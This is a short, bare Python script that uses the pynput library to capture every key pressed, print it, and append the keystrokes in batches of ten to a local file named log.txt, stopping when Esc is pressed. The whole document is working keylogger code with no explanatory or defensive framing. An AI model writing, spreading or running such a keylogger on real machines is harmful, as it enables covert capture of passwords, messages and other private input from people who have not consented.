import pynput
from pynput.keyboard import Key,Listener

count=0
keys=[]
def on_press(key):
    global keys,count
    keys.append(key)
    count+=1
    print(format(key))
    if count >=10:
        count=0
        write_file(keys)
        keys=[]

def write_file(keys):
    with open("log.txt","a") as f:
        for key in keys:
            key=str(key).replace("'","")
            if key.find('space')>0:
                key=" "
            f.write(str(key))
            
        f.write("\n")
def on_release(key):
    if key==Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()